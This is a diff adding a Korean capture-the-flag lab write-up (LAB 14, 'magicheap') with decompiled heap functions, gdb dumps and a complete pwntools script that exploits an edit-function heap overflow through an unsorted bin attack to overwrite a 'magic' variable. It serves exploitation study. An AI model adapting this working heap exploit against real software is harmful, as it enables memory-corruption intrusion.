@@ -1066,3 +1066,201 @@ uid=1000(bskim)
 
 나는 로컬에서 하는 거라 그냥 로컬 립시를 사용했는데 도커 환경으로 하면 립시는 어찌하는지 잘모르겠다. 알아서 찾아서 해야 하나보다.. 처음에 진짜 얼토당토 않은 걸로 삽질 했었는데 leak 한다고.. 역시 소스를 자세히 잘 분석해야 한다..ㅠㅠ 
 
+<br>
+
+# LAB 14
+
+```c
+unsigned __int64 create_heap()
+{
+  signed int i; // [rsp+4h] [rbp-1Ch]
+  size_t size; // [rsp+8h] [rbp-18h]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  for ( i = 0; i <= 9; ++i )
+  {
+    if ( !heaparray[i] )
+    {
+      printf("Size of Heap : ");
+      read(0, &buf, 8uLL);
+      size = atoi(&buf);
+      heaparray[i] = malloc(size);
+      if ( !heaparray[i] )
+      {
+        puts("Allocate Error");
+        exit(2);
+      }
+      printf("Content of heap:", &buf);
+      read_input(heaparray[i], size);
+      puts("SuccessFul");
+      return __readfsqword(0x28u) ^ v4;
+    }
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+create heap()
+
+```c
+unsigned __int64 edit_heap()
+{
+  __int64 v0; // ST08_8
+  int v2; // [rsp+4h] [rbp-1Ch]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, &buf, 4uLL);
+  v2 = atoi(&buf);
+  if ( v2 < 0 || v2 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( heaparray[v2] )
+  {
+    printf("Size of Heap : ", &buf);
+    read(0, &buf, 8uLL);
+    v0 = atoi(&buf);
+    printf("Content of heap : ", &buf);
+    read_input(heaparray[v2], v0);
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+edit heap()
+
+```c
+unsigned __int64 delete_heap()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, &buf, 4uLL);
+  v1 = atoi(&buf);
+  if ( v1 < 0 || v1 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( heaparray[v1] )
+  {
+    free(heaparray[v1]);
+    heaparray[v1] = 0LL;
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+delete heap()
+
+그냥 깔끔하게 malloc, edit, free 이렇게 되어 있는데 edit에서 overflow가 가능하다.
+
+```c
+if ( v3 == 4 )
+        exit(0);
+      if ( v3 == 4869 )
+      {
+        if ( (unsigned __int64)magic <= 0x1305 )
+        {
+          puts("So sad !");
+        }
+        else
+        {
+          puts("Congrt !");
+          l33t();
+        }
+      }
+```
+
+main에 이런 부분이 있다 4869를 입력했을 때 magic안의 값이 0x1305보다 크면 flag를 읽어주는 함수가 호출된다.
+
+저안에 큰 값을 쓰기만하면 되니 unsorted bin attack으로 간단하게 풀 수 있다.
+
+```c
+gdb-peda$ x/100gx 0x93c000
+0x93c000:	0x0000000000000000	0x0000000000000031
+0x93c010:	0x6161616161616161	0x6161616161616161
+0x93c020:	0x6161616161616161	0x6161616161616161
+0x93c030:	0x0000000000000000	0x0000000000000111
+0x93c040:	0x0000000000000000	0x00000000006020b0
+```
+
+1 chunk를 free하고 0 chunk에서 edit로 bk를 조작해준다. (magic -0x10)
+
+```c
+0x6020c0 <magic>:	0x00007f8589253b78	0x0000000000000000
+```
+
+그리고 다시 같은 크기로 malloc을 할당해 주면 magic안에 main_arena+88이 들어가게 된다. 그 후 4869를 입력해 주면 된다.
+
+```python
+from pwn import * 
+
+t = process('./magicheap')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def a(a,b):
+	r(":")
+	s("1")
+	r(":")
+	s(str(a))
+	r(":")
+	s(str(b))
+
+def ed(a,b,c):
+	r(":")
+	s("2")
+	r(":")
+	s(str(a))
+	r(":")
+	s(str(b))
+	r(":")
+	s(str(c))
+
+def d(a):
+	r(":")
+	s("3")
+	r(":")
+	s(str(a))
+
+a(0x20,"a")
+a(0x100,"a")
+a(0x20,"a")
+
+d(1)
+
+ed(0,0x100,"a"*0x20 + p64(0) + p64(0x111) + p64(0) + p64(0x00000000006020C0 - 0x10))
+a(0x100,"b")
+r(":")
+s("4869")
+t.interactive()
+
+Congrt !
+cat: /home/magicheap/flag: 그런 파일이나 디렉터리가 없습니다
+```
+
+local....
+
+<br>
+
